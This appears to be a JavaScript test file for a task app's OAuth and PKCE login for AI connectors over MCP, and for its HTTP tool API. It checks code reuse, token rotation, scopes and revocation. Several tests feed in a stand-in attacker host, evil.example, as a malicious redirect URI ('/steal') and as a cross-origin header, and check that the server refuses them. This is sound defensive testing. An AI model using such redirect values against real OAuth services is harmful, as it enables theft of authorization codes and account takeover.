    expect(tokens.body).toMatchObject({ token_type: "Bearer", expires_in: 3600, scope: "tasks.read" });
    expect(tokens.body.access_token).toMatch(/^zeph_at_/);
    expect(tokens.body.refresh_token).toMatch(/^zeph_rt_/);

    const tools = (await mcpList(tokens.body.access_token)).body.result.tools.map((t) => t.name);
    expect(tools).not.toContain("create_task");
    const grants = (await session(s.person)("GET", "/ai/grants")).body.grants;
    expect(grants).toEqual([expect.objectContaining({ kind: "oauth", label: "Claude", can_write: false, time_zone: "Europe/London" })]);
    // A refresh token isn't an access token.
    expect((await mcpList(tokens.body.refresh_token)).statusCode).toBe(401);
  });

  it("the consent page says who's asking and where it returns, and a refusal goes back as access_denied", async () => {
    const person = await login("oauth-deny@example.com");
    const client = (await register({ client_name: "Totally Zephyrly", redirect_uris: ["https://evil.example/cb"] })).body;
    const { challenge } = pkce();
    const started = await authorize({ response_type: "code", client_id: client.client_id, redirect_uri: "https://evil.example/cb", code_challenge: challenge, code_challenge_method: "S256", state: "s1", scope: "tasks.read tasks.write" });
    const requestId = String(started.headers.Location).split("/connect/")[1];
    expect((await invoke(`/api/apps/test-app/ai/connect/${requestId}`)).statusCode).toBe(401);
    const asked = await session(person)("GET", `/ai/connect/${requestId}`);
    expect(asked.body).toEqual({ client_name: "Totally Zephyrly", redirect_host: "evil.example", wants_changes: true });
    const denied = await session(person)("POST", `/ai/connect/${requestId}`, { approve: false });
    const back = new URL(denied.body.redirect_to);
    expect(Object.fromEntries(back.searchParams)).toMatchObject({ error: "access_denied", state: "s1" });
    expect((await session(person)("GET", `/ai/connect/${requestId}`)).statusCode).toBe(404);
    expect((await session(person)("GET", "/ai/grants")).body.grants).toEqual([]);
  });

  it("won't redirect anywhere it can't trust, and sends other mistakes back to the app", async () => {
    const client = (await register({ client_name: "App", redirect_uris: [CALLBACK] })).body;
    const { challenge } = pkce();
    const good = { response_type: "code", client_id: client.client_id, redirect_uri: CALLBACK, code_challenge: challenge, code_challenge_method: "S256", state: "s9" };

    const unknown = await authorize({ ...good, client_id: "zcl_nope" });
    expect(unknown.statusCode).toBe(400);
    expect(unknown.headers["Content-Type"]).toMatch(/^text\/html/);
    expect(unknown.headers.Location).toBeUndefined();
    expect(unknown.body.toString()).toContain("isn&#39;t registered");
    const elsewhere = await authorize({ ...good, redirect_uri: "https://evil.example/steal" });
    expect(elsewhere.statusCode).toBe(400);
    expect(elsewhere.headers.Location).toBeUndefined();

    for (const [params, error] of [
      [{ ...good, code_challenge_method: "plain" }, "invalid_request"],
      [{ ...good, code_challenge: "" }, "invalid_request"],
      [{ ...good, response_type: "token" }, "unsupported_response_type"],
      [{ ...good, resource: "https://other.example/mcp" }, "invalid_target"],
    ]) {
      const back = await authorize(params);
      expect(back.statusCode).toBe(302);
      const url = new URL(String(back.headers.Location));
      expect(url.origin + url.pathname).toBe(CALLBACK);
      expect(url.searchParams.get("error")).toBe(error);
      expect(url.searchParams.get("state")).toBe("s9");
    }
  });

  it("a code only works once, with its own verifier, client and return address; a replay ends the connection", async () => {
    const s = await signIn("oauth-code@example.com");
    expect((await trade(s, { code_verifier: pkce().verifier })).body.error).toBe("invalid_grant");
    // That attempt used the code up.
    expect((await trade(s)).body.error).toBe("invalid_grant");

    const t = await signIn("oauth-code2@example.com");
    expect((await trade(t, { client_id: "zcl_other" })).body.error).toBe("invalid_grant");
    const u = await signIn("oauth-code3@example.com");
    expect((await trade(u, { redirect_uri: "https://claude.ai/other" })).body.error).toBe("invalid_grant");

    const v = await signIn("oauth-code4@example.com");
    const first = await trade(v);
    expect(first.statusCode).toBe(200);
    const replay = await trade(v);
    expect(replay.body.error).toBe("invalid_grant");
    expect((await mcpList(first.body.access_token)).statusCode).toBe(401);
  });

  it("refresh tokens rotate, and a reused one disconnects the app", async () => {
    const s = await signIn("oauth-refresh@example.com", { canWrite: true });
    const first = (await trade(s)).body;
    expect(first.scope).toBe("tasks.read tasks.write");
    const second = await form("/api/oauth/token", { grant_type: "refresh_token", refresh_token: first.refresh_token, client_id: s.client.client_id });
    expect(second.statusCode).toBe(200);
    expect(second.body.refresh_token).not.toBe(first.refresh_token);
    expect((await mcpList(second.body.access_token)).statusCode).toBe(200);

    const stolen = await form("/api/oauth/token", { grant_type: "refresh_token", refresh_token: first.refresh_token, client_id: s.client.client_id });
    expect(stolen.body.error).toBe("invalid_grant");
    expect((await mcpList(second.body.access_token)).statusCode).toBe(401);
    expect((await session(s.person)("GET", "/ai/grants")).body.grants).toEqual([]);
  });

  it("signing the same app in again updates its one connection", async () => {
    const s = await signIn("oauth-again@example.com");
    await trade(s);
    const { verifier, challenge } = pkce();
    const started = await authorize({ response_type: "code", client_id: s.client.client_id, redirect_uri: CALLBACK, code_challenge: challenge, code_challenge_method: "S256" });
    const requestId = String(started.headers.Location).split("/connect/")[1];
    const decided = await session(s.person)("POST", `/ai/connect/${requestId}`, { approve: true, can_write: true });
    const code = new URL(decided.body.redirect_to).searchParams.get("code");
    expect((await form("/api/oauth/token", { grant_type: "authorization_code", code, code_verifier: verifier, client_id: s.client.client_id })).statusCode).toBe(200);
    const grants = (await session(s.person)("GET", "/ai/grants")).body.grants;
    expect(grants).toHaveLength(1);
    expect(grants[0].can_write).toBe(true);
  });

  it("revoking a token disconnects the app, and unknown tokens are accepted quietly", async () => {
    const s = await signIn("oauth-revoke@example.com");
    const tokens = (await trade(s)).body;
    expect((await form("/api/oauth/revoke", { token: tokens.access_token })).statusCode).toBe(200);
    expect((await mcpList(tokens.access_token)).statusCode).toBe(401);
    expect((await form("/api/oauth/token", { grant_type: "refresh_token", refresh_token: tokens.refresh_token, client_id: s.client.client_id })).body.error).toBe("invalid_grant");
    expect((await form("/api/oauth/revoke", { token: "zeph_at_unknown" })).statusCode).toBe(200);
  });
});

describe("the same tools over plain HTTP (/api/v1)", () => {
  const today = () => new Intl.DateTimeFormat("en-CA", { timeZone: "America/New_York" }).format(new Date());
  const sessionApi = (token) => async (method, path, body) =>
    invoke(`/api/apps/test-app${path}`, { method, headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" }, body });
  const makeToken = async (session, canWrite) =>
    (await sessionApi(session)("POST", "/ai/tokens", { label: "Shortcuts", can_write: canWrite, time_zone: "America/New_York" })).body.token;
  const tool = (token, name, args, headers = {}) =>
    invoke(`/api/v1/tools/${name}`, { method: "POST", headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json", ...headers }, body: args });

  beforeEach(() => resetRateLimits());

  it("describes itself in OpenAPI, generated from the tools", async () => {
    const doc = await invoke("/api/v1/openapi.json");
    expect(doc.statusCode).toBe(200);
    expect(doc.body.openapi).toBe("3.1.0");
    expect(doc.body.servers).toEqual([{ url: "http://127.0.0.1:4173" }]);
    expect(doc.body.paths["/api/v1/tools/get_agenda"].post).toMatchObject({ operationId: "get_agenda", security: [{ bearer: [] }] });
    expect(doc.body.paths["/api/v1/tools/create_task"].post.requestBody.content["application/json"].schema.required).toEqual(["title"]);
    expect(Object.keys(doc.body.paths)).toHaveLength(allTools().length);
  });

  it("answers with readable text and data, and refuses with ok: false and the reason", async () => {
    const session = await login("v1-user@example.com");
    await sessionApi(session)("POST", "/entities/Task", { title: "Water the ferns", due_date: today() });
    const reader = await makeToken(session, false);

    const listed = await invoke("/api/v1/tools", { headers: { Authorization: `Bearer ${reader}` } });
    expect(listed.body.tools.map((t) => t.name)).not.toContain("create_task");

    const agenda = await tool(reader, "get_agenda", {});
    expect(agenda.statusCode).toBe(200);
    expect(agenda.body.ok).toBe(true);
    expect(agenda.body.text).toContain("Water the ferns");
    expect(agenda.body.data.days[0].tasks[0].title).toBe("Water the ferns");
    // An empty body is no arguments.
    expect((await invoke("/api/v1/tools/get_agenda", { method: "POST", headers: { Authorization: `Bearer ${reader}` } })).body.ok).toBe(true);

    const refused = await tool(reader, "create_task", { title: "From Siri", due_date: today() });
    expect(refused.statusCode).toBe(200);
    expect(refused.body.ok).toBe(false);
    expect(refused.body.text).toContain("can only read");
    expect((await tool(reader, "no_such_tool", {})).statusCode).toBe(404);
    expect((await tool(reader, "get_agenda", { days: "lots" })).body).toEqual({
      ok: false,
      text: '"days" must be a whole number.',
      spoken: '"days" must be a whole number.',
    });
    // What Siri reads: a sentence, no ids.
    expect(agenda.body.spoken).toBe("Today you have one thing: Water the ferns.");

    const writer = await makeToken(session, true);
    const added = await tool(writer, "create_task", { title: "From Siri", due_date: today() });
    expect(added.body.ok).toBe(true);
    expect(added.body.spoken).toBe("Added From Siri for today.");
    expect((await sessionApi(session)("GET", `/entities/Task/${added.body.data.id}`)).body.title).toBe("From Siri");
  });

  it("holds to the same guards as MCP", async () => {
    const session = await login("v1-guards@example.com");
    const token = await makeToken(session, false);
    expect((await tool("", "get_agenda", {})).statusCode).toBe(401);
    expect((await tool(session, "get_agenda", {})).statusCode).toBe(401);
    expect((await tool(token, "get_agenda", {}, { Origin: "https://evil.example" })).statusCode).toBe(403);
    const badJson = await invoke("/api/v1/tools/get_agenda", { method: "POST", headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" }, body: "{nope" });
    expect(badJson.statusCode).toBe(400);
    expect((await invoke("/api/v1/tools/get_agenda", { headers: { Authorization: `Bearer ${token}` } })).statusCode).toBe(404);
  });
});

async function writeZip(entries) {
  const { planZip } = await import("./zip.js");
  const zip = planZip(entries);
  const chunks = [];
  await zip.write(async (chunk) => {
    chunks.push(chunk);
  });
  return Buffer.concat(chunks);
}
